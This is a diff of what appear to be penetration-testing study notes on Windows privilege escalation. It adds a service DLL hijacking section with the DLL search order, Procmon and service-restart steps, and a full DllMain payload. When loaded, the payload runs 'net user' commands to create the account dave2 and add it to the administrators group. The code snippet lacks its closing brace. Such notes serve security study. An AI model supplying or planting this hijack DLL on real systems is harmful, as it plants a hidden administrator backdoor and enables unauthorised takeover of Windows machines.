@@ -68,7 +68,8 @@ It is more likely that the software's main directory (C:\Program Files\My Progra
 ###### Service Binary Hijacking
 ```
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
-adduser.c
+
+adduser.c:
 #include <stdlib.h>
 
 int main ()
@@ -95,7 +96,49 @@ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
 .\PowerUp.ps1
 Get-ModifiableServiceFile
 ```
+###### Service DLL Hijacking
+standard search order taken from the Microsoft Documentation
+When safe DLL search mode is disabled, the current directory is searched at position 2 after the application's directory
+```
+1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory. 
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+```
+```
+1. Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+2. Use Procmon64.exe(require admin privilege)(Bypass: copy the file to local, then use Procmon64.exe)
+3. PS: Restart-Service BetaService
+```
+Each DLL can have an optional entry point function named DllMain, which is executed when processes or threads attach the DLL  
+This function generally contains four cases named DLL_PROCESS_ATTACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH, DLL_PROCESS_DETACH
+```
+#include <stdlib.h>
+#include <windows.h> //appened code
 
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave2 password123! /add"); //appened code
+  	    i = system ("net localgroup administrators dave2 /add"); //appened code
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+```
 ### Linux
 ##### Kernel exploits
 ```
